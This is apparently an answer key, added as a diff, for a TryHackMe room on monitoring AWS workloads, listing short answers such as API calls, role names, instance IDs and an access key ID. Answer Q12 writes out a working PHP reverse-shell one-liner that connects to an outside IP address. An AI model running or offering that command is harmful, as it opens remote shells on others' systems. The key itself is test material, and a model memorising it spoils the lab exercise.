@@ -1,0 +1,68 @@
+Monitoring AWS Workloads
+https://tryhackme.com/room/monitoringawsworkloads
+
+Source: https://github.com/cosmicline/TryHackMe-Answers/blob/e750bcb8aa3be24eb5fce03369f35ccc5ad704f7/Monitoring%20AWS%20Workloads
+Answers in the source's question order; room revisions may change numbering.
+
+Q1
+SendCommand, StartSession
+
+Q2
+Amazon EC2 Auto Scaling
+
+Q3
+2026-01-14 23:44:19
+
+Q4
+react-boilerplate
+
+Q5
+Search Private Keys or Passwords
+
+Q6
+Yea
+
+Q7
+Yea
+
+Q8
+thm-db, thm-web
+
+Q9
+thm/website:latest
+
+Q10
+/usr/sbin/apache2
+
+Q11
+whoami
+
+Q12
+php -r $sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");
+
+Q13
+img-processor-role-ztpjz457
+
+Q14
+JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=
+
+Q15
+ImageProcessorRole
+
+Q16
+AddPermission20150331v2
+
+Q17
+carl.brown, AKIAVZZK4G6EZH7GIZY3
+
+Q18
+1837
+
+Q19
+i-054e705408f5fa5de, i-056219235e66e3f94
+
+Q20
+AWS-RunShellScript
+
+Q21
+Boto3/1.40.4
